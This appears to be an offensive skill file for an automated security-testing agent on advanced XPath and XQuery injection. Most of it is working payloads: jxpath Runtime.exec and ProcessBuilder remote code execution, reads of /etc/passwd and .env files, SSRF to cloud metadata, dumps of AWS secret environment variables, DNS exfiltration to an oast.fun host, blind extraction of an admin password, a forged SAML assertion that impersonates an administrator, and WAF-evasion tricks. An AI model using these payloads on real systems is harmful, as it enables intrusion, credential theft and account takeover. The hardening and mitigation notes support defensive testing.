---
name: xpath-injection-advanced-deep
description: XPath advanced depth — per-library parsing differentials (libxml2/Saxon/JAXP/jxpath/.NET/lxml), XPath 2.0/3.0 full function abuse surface, XQuery superclass, SAML signature-reference primitive, blind extraction at depth, error-based primitives, and WAF filter-bypass as a technique class
sibling: xpath_injection
load_when: scan_mode == "deep"
---

# XPath Injection — Advanced + Expert Depth

This is the advanced+expert deep sibling to `xpath_injection.md`. The base owns the predicate-break primitive, the payload family, blind extraction's basic shape, the XPath 2.0/3.0 function-abuse introduction, and per-library hardening defaults. This file owns the full established technique surface at depth: per-library parsing differentials with precise behavior per-engine, XPath 2.0/3.0 function abuse at the full surface, XQuery superclass primitives, the SAML signature-reference XPath primitive class, blind-extraction protocol discipline, error-based extraction, out-of-band channels via `doc()`/`unparsed-text()`, and WAF/filter bypass as a technique class. The novel sibling `xpath_injection_novel_deep.md` owns the 2024–2026 CVE catalogue.

Load this file when the goal is reasoning about which XPath engine is in play, choosing between XPath 1.0 blind extraction and XPath 2.0/3.0 function-abuse primitives, bypassing a WAF that filters XPath metacharacters, or writing up a SAML signature-reference bypass.

## Per-Library Parsing Differentials

Each XPath engine has its own grammar extensions, function support, external-URI policy, and error-reporting shape. Fingerprinting the engine before choosing a primitive class is the pre-flight; the matrix below captures the practical surface.

### libxml2 (Python `lxml`, PHP `DOMXPath`, Node `libxmljs`, C libxml2)

- **XPath version:** 1.0 by default. `lxml.etree.XPath` adds XSLT-flavored functions but the XPath layer is 1.0.
- **Extension functions:** none by default; `lxml` can register Python callables as XPath functions via `FunctionNamespace`, which is a reflection path if attacker-reachable (indirect; rare).
- **External URI resolution:** `document()` extension function exists in `lxml`'s XSLT layer but not the XPath layer. In XPath-only context, no `doc()`.
- **Default hardening:** `XPATH_NO_INET` option disables network access for `document()` under XSLT; libxml2 2.9+ also tightened entity resolution (see `xxe.md` for the overlap).
- **Fingerprint error:** `XPath error : Invalid expression`, or `XPathEvalError`.
- **Reach primitives:** XPath 1.0 primitives only — predicate break, union, boolean/time blind extraction. For `document()` reach, the engine must be XSLT-side (route to `xslt_injection.md`).

**Worked attack recipe (Python lxml XPath 1.0, attacker-reachable `./text`):**
```python
# Vulnerable pattern
from lxml import etree
tree = etree.fromstring(users_xml)
# WRONG — concatenation:
result = tree.xpath(f"/users/user[name='{username}']/role/text()")
```
Injection payload: `' or '1'='1`. Fired, the composed expression becomes `/users/user[name='' or '1'='1']/role/text()` — all users returned, roles leaked.

**Confirmation signals (lxml):**
1. **`XPathEvalError: Invalid expression`** on a malformed close — confirms lxml is the engine.
2. **Expanded result set** — N users returned where previously 1.
3. **Reflected `substring()` extraction** of a known-good attribute (`mail`) — confirms blind-extraction oracle before targeting unknown.

### Python `lxml.etree.XPath` and `.xpath()` (Expanded)

- **Features:** XPath 1.0; `FunctionNamespace` for extensions; XSLT via `etree.XSLT(stylesheet)`.
- **Default parser hardening:** `XMLParser(no_network=True, resolve_entities=False)` is NOT the default — explicit opt-in. Default parser resolves entities on parse.
- **Attack vector sinks grep:** `tree.xpath(`, `etree.XPath(`, `etree.ETXPath(` with f-string or `.format()` arguments. The idiom `tree.xpath('/users/user[name=$u]', u=username)` with parameterization is safe; the concatenation idiom is not.
- **Specific CVE-reaching deployment:** `langchain-text-splitters` CVE-2025-6985 class exposes `lxml.etree.parse` + XSLT without hardening — the XPath side is adjacent (same lxml instance).
- **Measurement anchor:** `python -c "from lxml import etree; print(etree.LXML_VERSION)"` → version matrix; versions ≤ 4.9.x have default-permissive entity resolution.

### Saxon-HE / PE / EE

- **XPath version:** 2.0 (HE), 3.0 (PE+), 3.1 (EE for XQuery UP).
- **Extension functions:** HE disables Java extension functions by default; PE/EE expose `java:` reflection functions when `ALLOW_EXTERNAL_FUNCTIONS` is `true`.
- **External URI resolution:** `doc()`, `document()`, `unparsed-text()`, `collection()`, `fn:json-doc()` all resolve URIs. Default: on. Hardening: `setConfigurationProperty(FeatureKeys.ALLOWED_PROTOCOLS_FOR_URI_RESOLUTION, "")` or `null URIResolver`.
- **Default hardening:** `FEATURE_SECURE_PROCESSING` (JAXP standard) + Saxon-specific `ALLOW_EXTERNAL_FUNCTIONS=false`. Both must be set — the second is Saxon-specific.
- **Fingerprint error:** `net.sf.saxon.trans.XPathException`, with a specific error code (`XPTY0004`, `XPST0003`, etc.) that identifies Saxon.
- **Reach primitives:** full XPath 3.0 function surface — `doc()` SSRF, `unparsed-text()` file-read, `fn:environment-variable()` env dump, `java:*` RCE on PE/EE where extension-function flag is on.

### Java JAXP (`javax.xml.xpath.XPath`)

- **XPath version:** 1.0 (interface mandates 1.0; underlying processor may be Saxon or Xalan, which can be upgraded via SPI).
- **Extension functions:** via `XPathFunctionResolver`; blank by default, but a developer-registered resolver may expose arbitrary methods.
- **External URI resolution:** controlled by the SAX-level `URIResolver`; defaults to the system default (which can resolve local files and http/https).
- **Default hardening:** `XMLConstants.FEATURE_SECURE_PROCESSING = true` restricts, but the XPath API is independent of the parse-side `secure processing` flag — must be set on the XPath factory separately.
- **Fingerprint error:** `javax.xml.xpath.XPathExpressionException`, often wrapping an underlying exception that identifies the processor.
- **Reach primitives:** XPath 1.0 only via standard; developer-registered functions can expose reflection, filesystem, or network.

### commons-jxpath (`org.apache.commons.jxpath.*`)

- **XPath version:** 1.0 plus jxpath extensions.
- **Extension functions:** **jxpath exposes `java.lang.*` reflection functions by default** via `BasicNamespaceResolver` + `PackageFunctions`. This is the primitive that makes jxpath a direct-RCE sink: `java.lang.Runtime.getRuntime().exec('id')` is reachable as an XPath expression.
- **External URI resolution:** no built-in; jxpath operates on in-memory `JXPathContext` over JavaBeans/Maps/DOM.
- **Default hardening:** the Convertigo CVE-2025-43955 fix is `jxpathContext.setFunctions(FunctionLibrary.create())` — an empty FunctionLibrary — which blanks the Java-reflection extensions. Any jxpath deployment that does not do this is reachable.
- **Fingerprint error:** `org.apache.commons.jxpath.JXPathException`.
- **Reach primitives:** direct RCE via `java.lang.Runtime.exec`, filesystem via `java.io.File`, SSRF via `java.net.URL.openStream`. This is the standout engine — the only mainstream library where XPath 1.0 reaches RCE without extension functions needing explicit registration.

**Worked attack recipe (direct RCE via jxpath Java reflection):**
```xpath
// XPath expression reaching the vulnerable JXPathContext.getValue(context, xpath)
// where xpath is attacker-influenced

// Direct Runtime.exec reach:
java.lang.Runtime.getRuntime().exec('id')

// With command parsing (space-safe form via array):
java.lang.Runtime.getRuntime().exec(string:split('id -a', ' '))

// Filesystem read:
new java.io.BufferedReader(new java.io.FileReader('/etc/passwd')).readLine()

// Outbound HTTP (SSRF primitive):
new java.net.URL('http://169.254.169.254/latest/meta-data/').openStream()

// Via ProcessBuilder (preferred where exec is blocked):
new java.lang.ProcessBuilder(java.util.Arrays.asList('/bin/sh', '-c', 'id')).start()
```

**Alternate recipe (nested JS via ScriptEngineManager — Nashorn-shaped reach):**
```xpath
new javax.script.ScriptEngineManager().getEngineByName('nashorn').eval('java.lang.Runtime.getRuntime().exec("id")')
```
Works where Nashorn is on the classpath (JDK 8–14; removed in JDK 15+). Chains to full nested JS reach.

**Confirmation signals (jxpath).**
1. **Exec result in result set.** If the sink reflects the XPath result, `Runtime.exec('id')` returns a `Process` object; the `toString()` is `Process[pid=NNNN,...]` — proof.
2. **Side-effect in filesystem.** `Runtime.exec('touch /tmp/pwned')` + verify file.
3. **OAST hit via URL.openStream.**
4. **`JXPathException` echoing the invoking method name** — confirms jxpath is the engine.
5. **Dependency grep match.** `pom.xml` or `build.gradle` listing `commons-jxpath` without `setFunctions(FunctionLibrary.create())` nearby — architectural finding independent of input-path reach.

**Impact.** Full host RCE as the Java application process. The vulnerability class is architectural — present wherever jxpath is wired without FunctionLibrary blanking. Grep-reachable.

### Jaxen (`org.jaxen.*`)

- **XPath version:** 1.0 (plus some 2.0 extensions).
- **Extension functions:** registered via `XPathFunctionContext.registerFunction(ns, name, fn)`. Not registered by default; application-dependent.
- **External URI resolution:** no built-in.
- **Default hardening:** application-level; Jaxen itself is minimal.
- **Fingerprint error:** `org.jaxen.XPathSyntaxException`.
- **Reach primitives:** XPath 1.0 only; extensions must be explicitly registered.

### .NET `XPathNavigator` / `XmlDocument.SelectNodes` / `XElement.XPath*`

- **XPath version:** 1.0 (XPathNavigator); 2.0 via Microsoft XML Core Services 6.0 (MSXML6) in COM contexts.
- **Extension functions:** `XsltCompiledTransform` has extension-function support (XSLT side — see `xslt_injection.md`); the pure-XPath API is 1.0 and sealed.
- **External URI resolution:** not supported in pure XPath. XSLT's `document()` is a different sink.
- **Default hardening:** MSXML6 disables external DTDs by default; XPath 1.0 has no external-reach primitives.
- **Fingerprint error:** `System.Xml.XPath.XPathException`.
- **Reach primitives:** XPath 1.0 only — predicate break and blind extraction; no network, no file, no reflection.

### Python `lxml.etree.XPath` and `.xpath()`

- **XPath version:** 1.0.
- **Extension functions:** via `FunctionNamespace`. Not registered by default.
- **External URI resolution:** XSLT-side `document()` is network-reachable unless `no_network=True` is passed to the XSLT constructor. XPath-side: no reach.
- **Default hardening:** `lxml.etree.XMLParser(no_network=True, resolve_entities=False)` and friends; XPath layer inherits parse-side settings.
- **Fingerprint error:** `lxml.etree.XPathEvalError`.
- **Reach primitives:** XPath 1.0 only in the pure XPath context.

### PHP `DOMXPath::evaluate`

- **XPath version:** 1.0.
- **Extension functions:** `DOMXPath::registerPhpFunctions($allowed)` grants reach into PHP functions. If called without arguments (or with no allowlist), all PHP functions are reachable — including `system`, `exec`, `shell_exec`, `passthru`. This is a direct-RCE sink parallel to jxpath on Java.
- **External URI resolution:** none in XPath.
- **Default hardening:** `registerPhpFunctions()` is opt-in; applications that call it enable RCE unless they pass a specific allowlist.
- **Fingerprint error:** PHP warning/notice shapes.
- **Reach primitives:** direct RCE via `php:function('system', 'id')` when `registerPhpFunctions()` is called; XPath 1.0 primitives otherwise. **This is the PHP side-channel analog to jxpath's Java reflection and libxslt-PHP's `php:function` — see `xslt_injection_advanced_deep.md` for the XSLT variant.**

### BaseX, eXist-db (XQuery / XPath 3.0 / 3.1)

- **XPath version:** 3.1 with XQuery superset.
- **Extension functions:** per-engine; eXist exposes `util:eval()`, `util:binary-doc()`, `file:read-string()` — direct code-execution / file-read primitives if reachable.
- **External URI resolution:** full `fn:doc()`, `fn:unparsed-text()`, HTTP module.
- **Default hardening:** engine-level permissions; typically a dedicated database-user grant.
- **Fingerprint error:** XQuery error codes (`XPTY0004`, `FORG0001`, engine-specific `BXDB0001` for BaseX, `XQDY0027` for eXist).
- **Reach primitives:** full XQuery superset — code execution via engine-specific `eval` functions, filesystem via `file:*` module, network via `http:*` module.

## XPath 2.0 / 3.0 Function Abuse — Full Surface

Beyond the base-file primer, the full XPath 2.0/3.0 function surface relevant to injection:

### External Resource Load

- **`fn:doc('URL')`** — fetches XML from URL. SSRF. Full response body parsed as XML (fail-closed on non-XML in some engines).
- **`fn:doc-available('URL')`** — boolean; returns true/false based on fetch success. OAST confirmation primitive — HTTP hit without needing the response body parsed.
- **`fn:document('URL')`** — XSLT-flavored variant with optional base-URI parameter; same primitive.
- **`fn:collection('URI')`** — directory-of-documents fetch; typically multiple HTTP requests.
- **`fn:unparsed-text('URL' [, encoding])`** — raw text fetch. Works where response is not XML (plain-text, HTML, JSON). Encoding parameter can specify UTF-8/UTF-16/etc.
- **`fn:unparsed-text-available('URL')`** — boolean; OAST primitive.
- **`fn:unparsed-text-lines('URL')`** — returns sequence of lines; useful for structured file read.
- **`fn:json-doc('URL')`** — XPath 3.1; parses JSON from URL into XPath data model. SSRF + JSON structured return.

**Worked recipes per function:**

- **SSRF via `fn:doc` to cloud metadata (reachability — credentials route elsewhere):**
  ```xpath
  ' or doc('http://169.254.169.254/latest/meta-data/')//region or 'a'='b
  ```
  The injection succeeds if the metadata response was fetched; `//region` returns the AWS region if the response parsed as XML, otherwise the fetch itself is still the primitive.

- **Local file read via `fn:unparsed-text`:**
  ```xpath
  ' | unparsed-text('file:///etc/passwd', 'UTF-8') | /dummy[name='a
  ```
  Returns the file contents as a text node — reflected if the result is rendered. Multi-line file content preserved as a single string.

- **DNS exfil via `fn:doc-available` boolean oracle:**
  ```xpath
  ' and doc-available(concat('http://', substring(TARGET, 1, 1), '.xyz.oast.fun/')) or 'a'='b
  ```
  Fire per-position. The DNS hit label-decodes one byte per request without needing a response body.

- **Env var dump via `fn:environment-variable`:**
  ```xpath
  ' | fn:environment-variable('AWS_SECRET_ACCESS_KEY') | /dummy[name='a
  ```
  Returns the env var value as a string.

- **JSON extraction via `fn:json-doc`:**
  ```xpath
  fn:json-doc('http://169.254.169.254/latest/dynamic/instance-identity/document')('region')
  ```
  Returns the JSON object's `region` field directly.

- **Fingerprint via `fn:system-property`:**
  ```xpath
  fn:system-property('xsl:vendor')             // "Saxonica" / "Apache" / "libxml2"
  fn:system-property('xsl:version')            // "2.0" / "3.0" / "3.1"
  ```
  Fingerprint before firing version-specific primitives.

### Local System Access

- **`fn:environment-variable('NAME')`** — returns env var. Direct extraction primitive.
- **`fn:available-environment-variables()`** — returns sequence of all env-var names. Enumeration primitive before specific extraction.
- **`fn:system-property('xsl:vendor')`, `fn:system-property('xsl:version')`** — processor fingerprint.
- **`fn:current-dateTime()`, `fn:implicit-timezone()`** — low-value information disclosure (host timezone).

### String Manipulation (XPath 2.0 standard; useful for extraction)

- **`fn:substring(string, start [, length])`** — character-by-character extraction primitive.
- **`fn:contains(string, substring)`** — boolean; blind extraction primitive.
- **`fn:starts-with(string, prefix)`, `fn:ends-with(string, suffix)`** — same, bounded directional.
- **`fn:string-length(string)`** — enumerate length before extraction.
- **`fn:string-to-codepoints(string)`** — returns sequence of integer codepoints; useful for Unicode extraction.

### XPath 3.0+ Function Call Syntax

- **`fn:function-lookup(QName, arity)`** — reflection: look up a function by name. Reaches engine-registered functions by name regardless of whether the attacker can type their namespace prefix.
- **`fn:function-name(fn)`, `fn:function-arity(fn)`** — reflection.
- **Higher-order functions** — `fn:for-each`, `fn:filter`, `fn:fold-left` — enable curried-function construction; combined with `function-lookup`, reach any registered function.

### XQuery Superset

XQuery is a superset of XPath; any XQuery engine (BaseX, eXist, Saxon in query mode, MarkLogic) accepts the full XQuery grammar when the query is submitted via the XQuery API. If an XPath sink is backed by an XQuery engine, the attacker can inject XQuery statements:
- **`let $x := doc('URL') return $x`** — module reach.
- **`try { ... } catch * { fn:error(QName, 'exfil') }`** — error-based exfil.
- **`xquery version "3.1"; import module namespace file = "http://expath.org/ns/file"; file:read-text('/etc/passwd')`** — direct file read via EXPath file module (BaseX, eXist, Saxon-EE support).

## SAML Signature-Reference XPath Primitive Class

CVE-2026-9390 (XML::Sig Perl) anchors a cross-library primitive class: any XMLDSig implementation that uses XPath to resolve `Signature/Reference/@URI` or `Signature/KeyInfo` elements is a candidate. The class is distinct from classical signature-wrapping attacks (XSW) because the resolver's XPath — not the SignedInfo canonicalization — is the gap.

**Primitive.** An XMLDSig signature-verification routine composes an XPath expression from the reference URI (e.g., `//Assertion[@ID='$ref']`) to locate the signed element. If the XPath lacks strict ID-uniqueness enforcement OR the attacker can inject XPath metacharacters into the URI fragment, the signature verifies over one element while the application subsequently reads attributes from a different element.

**Preconditions.**
1. XMLDSig implementation using XPath for signature-reference resolution (XML::Sig Perl, select Java libraries, select .NET libraries, select Python libraries).
2. Attacker can author or influence a SAML Response / signed XML document.
3. The application reads attributes from the signed document using element matching that returns a different element than the signature verified over.

**Attack recipe (duplicate-ID shape):**
```xml
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol">
  <saml:Assertion ID="legit-id" IssueInstant="..." Version="2.0" xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">
    <!-- Legitimate assertion signed by IdP; signature verifies over THIS element -->
    <saml:Subject>legit.user@example.com</saml:Subject>
  </saml:Assertion>
  <saml:Assertion ID="legit-id" IssueInstant="..." Version="2.0">
    <!-- Attacker-authored assertion with duplicate ID; application reads attributes HERE -->
    <saml:Subject>admin@example.com</saml:Subject>
    <saml:AttributeStatement>
      <saml:Attribute Name="role"><saml:AttributeValue>administrator</saml:AttributeValue></saml:Attribute>
    </saml:AttributeStatement>
  </saml:Assertion>
  <ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#">
    <ds:SignedInfo>
      <ds:Reference URI="#legit-id">...</ds:Reference>
    </ds:SignedInfo>
    <!-- Signature value verifies over the FIRST assertion with matching ID -->
  </ds:Signature>
</samlp:Response>
```

The XPath `//Assertion[@ID='legit-id']` matches both duplicate-ID assertions. The signature-verification path picks the first (verifies cryptographically); the attribute-reading path picks the second (reads attacker content). The gap is the XPath's lack of `[1]` positional enforcement combined with permissive duplicate-ID handling.

**Alternate recipe (XPath injection in the `@URI` fragment):**
```xml
<ds:Reference URI="#legit-id' | //Assertion[@ID='attacker-id">
```
Where the implementation builds its XPath by substituting the URI fragment textually, the attacker's `' | //` union redirects the match.

**Confirmation signals.**
1. **SAML login succeeds (signature verifies).**
2. **Session subject is the attacker's chosen identity**, not the legitimate IdP-signed subject.
3. **IdP-issued signature value matches the legitimate assertion**, verifiable via replay/diff.
4. **Duplicate-ID warnings in server logs** — some XMLDSig implementations log but do not reject.

**Impact.** Cross-user impersonation over SAML — attacker logs in as any user whose SAML attributes they can craft, including administrator accounts. The signature is cryptographically valid; audit logs show "legitimate signed assertion verified."

**Mitigation (per fix shape).**
- Use XMLDSig implementations that resolve references by `wsu:Id` or `xml:id` with strict uniqueness enforcement, not XPath pattern-match.
- Reject documents with duplicate ID attributes at parse time.
- Treat `//Assertion[@ID='...']` as a design-time anti-pattern in signature-reference code paths.

**Class generalization — library-level audit.** Grep SAML/XMLDSig libraries for:
- `XPath` + `Reference` or `SignedInfo` in the same method body.
- `getElementById` returning the first-match where multiple matches are possible.
- Composite checks that re-resolve the signed-element path separately from the signature-verification path.

Routes to `authentication_jwt.md` for the session-impersonation framing — the mechanism is XPath here; the token-level impersonation framing lives there.

## Blind Extraction at Depth

### Protocol: boolean-channel enumeration

Once a boolean oracle is confirmed (login-succeeds vs login-fails, filter-matches vs no-match, response-is-X vs response-is-Y), extraction follows the discipline:

1. **Length first.** `' and string-length(TARGET) = $N or 'a'='b` — binary search over N to find exact length. Reduces subsequent requests.
2. **Character-set bound.** For known-charset targets (printable ASCII, hex, base64), subset to that charset — alphabet of 95 vs 64 vs 16 matters.
3. **Binary search per position.** `' and substring(TARGET, $pos, 1) < 'm' or 'a'='b` — log₂(95) ≈ 7 requests per byte on printable ASCII.
4. **Parallelize.** Independent positions can run in parallel. A rate-limited target throttles concurrency; a non-throttled one extracts a 32-byte secret in ~250 requests total.
5. **Validation at every byte.** The boolean oracle's threshold can drift (session, caching); re-confirm periodically with a known-value check (`'1'='1'`).

**Worked example — extracting admin's `userPassword` char-by-char via login oracle:**

Setup. Vulnerable login endpoint:
```
POST /login
username=$u&password=$p
```
Server composes: `/users/user[name='$u' and password='$p']` → auth succeeds iff XPath returns ≥1 node.

Step 1 — length. Fire with password known-good:
```
username='] and string-length(/users/user[name='admin']/userPassword)=32 and name()='user' or '1'='
password=anything
```
Response-is-"login-succeeded" iff the admin password's `userPassword` attribute is 32 chars.

Step 2 — binary search char 1 (midpoint 'm'):
```
username='] and substring(/users/user[name='admin']/userPassword, 1, 1) < 'm' and name()='user' or '1'='
password=anything
```
Succeeds → char1 is in `[\0 - l]`. Fails → char1 is in `[m - \127]`. Six more requests narrow to the exact byte.

Step 3 — repeat for chars 2 through 32, parallelized across independent HTTP requests.

Total request count: 32 × 7 = 224 requests. On a non-rate-limited target, extraction completes in under a minute.

**Protocol-level pitfalls:**
- **Case folding.** XPath 1.0 `caseInsensitive` comparison means `'A' < 'm'` and `'a' < 'm'` are both true; add `translate(TARGET, 'ABCDE...', 'abcde...')` for case-normalization if the schema is `caseIgnoreMatch`.
- **Trailing whitespace.** `substring` on a trailing-whitespace-padded value may return a space character; handle with `normalize-space` where applicable.
- **Multi-byte characters.** XPath 1.0 `substring` is codepoint-based on XPath-2.0+ engines, byte-based on some XPath-1.0 implementations; test with a known multi-byte attribute first.

### Protocol: time-channel enumeration

If no boolean oracle exists but the engine supports `doc()`, use a hostile external URI as a time proxy:
```xpath
' and (if (substring(TARGET, $pos, 1) = 'a') then (count(doc('http://slow.oast.fun/5s')) > 0) else true()) and 'a'='a
```
A 5-second response delta indicates the condition was true (the slow URI was fetched). The time channel is noisier than boolean but survives on sinks that return only a 200 OK.

### Protocol: OAST-channel enumeration

If `doc()` or `document()` is reachable, label-based DNS exfil extracts without needing a response at all:
```xpath
' | doc(concat('http://', substring(TARGET, $pos, 1), '.xyz.oast.fun/x')) or 'a'='a
```
A DNS hit on `a.xyz.oast.fun` confirms the target character at $pos is `a`. Enumerate position × alphabet. Faster than boolean because each position is a single request (bounded by Interactsh collector throughput).

## Error-Based Extraction at Depth

Many engines emit XPath errors with the problematic subexpression — including user-supplied data — embedded in the error message:

- **Saxon** `XPST0003: Static error at character X: ...` includes the offending subexpression.
- **libxml2** `XPath error : Invalid expression` + line/column.
- **JAXP** wraps `XPathExpressionException` around the underlying processor error.
- **jxpath** `JXPathException: Invalid XPath: '...'` echoes the full expression.

### Error-oracle primitive

Craft an invalid XPath that references target data via `substring()`:
```xpath
substring(/users/user[name='admin']/pass/text(),1,10) || 'INVALID_SUFFIX_||'
```
The processor evaluates the substring (because XPath is left-to-right), then fails on the invalid syntax after — and the error message carries the evaluated substring result. Confirmation: a 500 response whose body contains the first 10 chars of the admin password.

Not every engine echoes evaluated values; Saxon 10+ sanitizes error output. libxml2 and jxpath are more verbose. Engine fingerprinting (above) tells you whether to attempt this primitive.

## Out-of-Band Channels via XPath Functions

The `doc()`/`document()`/`unparsed-text()` family doubles as:
- **SSRF** — route to `ssrf.md`. The XPath processor fetches the URI with its own HTTP stack; same proxy/metadata-reach semantics.
- **File read** — `unparsed-text('file:///etc/passwd')` returns the file contents as a string, reflected in the XPath result. Route to `path_traversal_lfi_rfi.md` for the containment class.
- **DNS exfil** — any URL fetch triggers DNS; `doc('http://CHARS.xyz.oast.fun/')` with CHARS encoding target data via DNS labels.

### XPath 2.0/3.0 cross-processor compatibility

- `fn:doc()` works on Saxon, BaseX, eXist, Zorba.
- `fn:document()` is XSLT-flavored but accepted by Saxon in XPath mode.
- `fn:unparsed-text()` is XPath 3.0 standard; Saxon-HE+, BaseX, eXist support.
- `fn:environment-variable()` is XPath 3.0; some processors require explicit opt-in.

## XQuery Superset Primitives

Where the XPath sink is backed by an XQuery engine (BaseX, eXist-db, Saxon in query mode, MarkLogic), the attacker can inject the full XQuery grammar. The injection surface is strictly larger than XPath.

**Primitive — module import for code execution:**
```xquery
xquery version "3.1";
import module namespace file = "http://expath.org/ns/file";
file:read-text('/etc/passwd')
```
EXPath file module — if the engine's permissions permit, reads any file the engine process can access. Saxon-EE, BaseX, and eXist support EXPath file module.

**Primitive — HTTP module for SSRF with full HTTP control:**
```xquery
xquery version "3.1";
import module namespace http = "http://expath.org/ns/http-client";
http:send-request(
  <http:request method="POST" href="http://169.254.169.254/latest/api/token">
    <http:header name="X-aws-ec2-metadata-token-ttl-seconds" value="21600"/>
  </http:request>
)
```
Full HTTP control — custom headers, methods, bodies. EXPath http-client module.

**Primitive — try/catch for error-based extraction:**
```xquery
try {
  let $target := /users/user[name='admin']/password
  return fn:error(xs:QName('attacker:x'), concat('EXFIL:', $target))
} catch * {
  'extracted' (: catches the error and the engine reports it :)
}
```
Error-based exfil — the engine's error reporting includes the composed error message with target data.

**Primitive — engine-specific eval (BaseX):**
```xquery
xquery version "3.1";
db:eval('require("child_process").execSync("id")')  (: BaseX db:eval reaches JS context :)
```
Reach depends on BaseX configuration and loaded modules.

**Primitive — module declaration for persistence:**
```xquery
module namespace m = "http://attacker/evil";
declare function m:backdoor() { ... };
```
Where the engine persists module registrations, this is a persistence primitive.

**Detection — engine fingerprint by error code:**
- `XPDY0002` → XPath 3.0/3.1 dynamic context error — likely Saxon or BaseX.
- `BXDB0001` → BaseX-specific.
- `XQDY0027` → eXist-specific validity error.
- `FORG0001` → cast error, common across XQuery engines.

## WAF / Filter Bypass as a Technique Class

WAFs and server-side XPath sanitizers typically block `'`, `"`, `[`, `]`, `(`, `)`, `/`, `|`, `*`, `and`, `or`, specific function names. The class defeats each.

### Metacharacter encoding

- **URL encoding** — `%27` for `'`, `%22` for `"`. Many sinks decode before passing to XPath; the WAF may inspect pre-decode.
- **Unicode normalization** — `U+FF07` (fullwidth apostrophe) may be normalized to `'` by the backend's string handling after passing the WAF; the WAF sees a non-ASCII character and lets it through.
- **XML character entities** — `&apos;`, `&#39;`, `&#x27;`. In contexts where the input is placed inside an XML document that is then parsed and XPath-evaluated, the entity decodes before XPath.
- **CDATA wrapping** — `<![CDATA['or '1'='1]]>` — preserves raw characters past WAF parsing but hands them to XPath verbatim.

### Keyword avoidance

- **`and`/`or`** → use XPath operators that behave similarly: `' | /*[string-length(name()) > 0]` for logical union; the predicate truthifies via the union rather than a boolean.
- **`'1'='1'`** → `string-length('x')=1` evaluates to true without the `=` character being adjacent to constants.
- **Function names** → `fn:substring` can be reached via `fn:function-lookup(QName('http://www.w3.org/2005/xpath-functions', 'substring'), 3)` with the namespace prefix spelled differently.

### Comment smuggling

XPath has no comment syntax, but XQuery does: `(: comment :)`. On XQuery-backed engines, interleave garbage inside `(: :)` to break pattern matchers:
```xpath
' or (: WAF-evading comment :) '1'='1
```

### XPath → XSLT escalation

A WAF watching the XPath predicate position may not watch the XSLT `select=` attribute. If the sink is an XSLT engine evaluating `select=`, the full XSLT extension-function surface (route to `xslt_injection.md`) is reachable.

### String construction via concat()

```xpath
concat('ad', 'min')              → 'admin' (reaches a filter without the literal 'admin')
concat(substring('x',0,0), 'secret_payload')  → payload constructed via XPath calls
```
Useful when a WAF matches literal strings (usernames, SQL/XPath keywords) but not computed-value equivalents.

### Case sensitivity and whitespace

- XPath function names are case-sensitive (`substring` ≠ `Substring`). Some WAFs are case-insensitive; craft payloads with uppercase function names if the engine accepts them (Saxon in some modes does).
- XPath whitespace handling: `[` can be `[` with embedded tabs/newlines in some engines. `fn:substring (name, 1, 10)` with the space between function and paren may bypass a tight pattern.

## Second-Order XPath Injection

Primitive: attacker input stored and later used in an XPath query by a different request path.

Preconditions:
- User input stored (user profile, saved search, workflow config).
- Downstream path (search, authorization check, audit) reads stored input and builds an XPath expression from it.

Pattern: "save a search filter" stores the filter string; "run saved search" composes it into an XPath. The injection fires at saved-search-run time, not save time.

Confirmation discipline: submit the injection via the save path, then trigger the run path; observe the differential at run time. Attribution requires a time correlation.

## Composite Chains

- **XPath auth-bypass → BFLA.** Bypass to admin → admin-only endpoint. Route to `broken_function_level_authorization.md`.
- **XPath → doc() → cloud metadata.** `doc('http://169.254.169.254/latest/meta-data/')` on an engine that fetches the URI. Metadata reachability only — credential extraction routes to `cloud/aws_metadata.md`.
- **XPath 3.0 → unparsed-text() → secret file.** `unparsed-text('file:///app/config/.env')` reads env file. Route to `information_disclosure.md`.
- **jxpath → Runtime.exec.** Direct RCE where FunctionLibrary not blanked. Route to `rce.md`.
- **XPath SAML signature-ref → session impersonation.** XMLDSig verifies the wrong element; attacker is any user. Route to `authentication_jwt.md` for the impersonation primitive.
- **XPath → XSLT escalation.** If sink is XSLT-side, promote to `xslt_injection.md` for the per-processor extension-function catalog.

## Advanced Testing Methodology

1. **Fingerprint before firing.** `fn:system-property('xsl:vendor')` reflected returns a vendor string. The error-shape also narrows: Saxon vs libxml2 vs jxpath vs .NET distinct error messages.
2. **Confirm the sink is XPath, not SQL or template.** A `' or '1'='1` input that produces a SQL error is SQL; one that produces an XPath error is XPath; one that reflects verbatim is neither.
3. **Build the oracle before extracting.** A reliable yes/no channel is a prerequisite for blind extraction — spend requests confirming the oracle is stable before launching an enumeration.
4. **Use binary search, not linear.** 7 requests per byte on printable ASCII vs 95 — the difference is 32× speedup and much less rate-limit exposure.
5. **Prefer OAST over blind if available.** `doc()`-reachable processors give a single-request-per-position primitive, far faster than binary search.
6. **Match the function surface to the processor.** `unparsed-text()` on Saxon-HE works; on libxml2 fails. Firing the wrong primitive wastes probes.
7. **For jxpath, do not extract — exec.** The direct RCE primitive via Java reflection is the finding; blind extraction wastes time.

## Advanced Validation

- **The predicate-break result-set change must be XPath-shaped.** An auth form returning "login OK" vs "login failed" is sufficient; a search that returns a count field is sufficient. A visual difference in page rendering without a semantic result-set change is not confirmation — the input may be reflected without being evaluated.
- **`fn:system-property('xsl:vendor')` reflected must return a vendor string.** `"Saxonica"`, `"Apache"`, or `"libxml2"` — not an echo of the input.
- **A `doc()` OAST hit must arrive in the request window.** Delayed hits (minutes later) are suspicious — could be an unrelated scanner, could be a delayed cache fetch, could be the XPath processor queueing the fetch.
- **Error-message leaks must contain target-sourced bytes.** An error that echoes attacker input is reflection, not extraction. An error that contains bytes present in the target data (an admin password hash prefix) is extraction.
- **A `substring()` returning the empty string for every position is not extraction.** The target node is missing or empty — not a successful extraction of empty data.

## False Positives

- **A result-set change that correlates with session drift.** Verify by rapid re-firing: the same input should produce the same result at the same time.
- **A `' or '1'='1'` payload reflected in a JSON `"message"` field.** The input was stored or echoed; not evaluated.
- **A 500 error from any input containing special characters.** Many frameworks return 500 on malformed input regardless of sink type. Confirm by varying the payload — `';` vs `'/`vs `')` should produce different error shapes if the sink is XPath; identical 500s suggest a generic input-validation reject.
- **An XPath-shaped payload against a GraphQL/REST endpoint.** The sink may be an in-memory filter that treats the input as a literal; verify by checking source paths.
- **A SAML Response field reflected with no signature change.** Reflections in SAML are routine. The finding is only valid if signature verifies over different content than the reflected assertion.
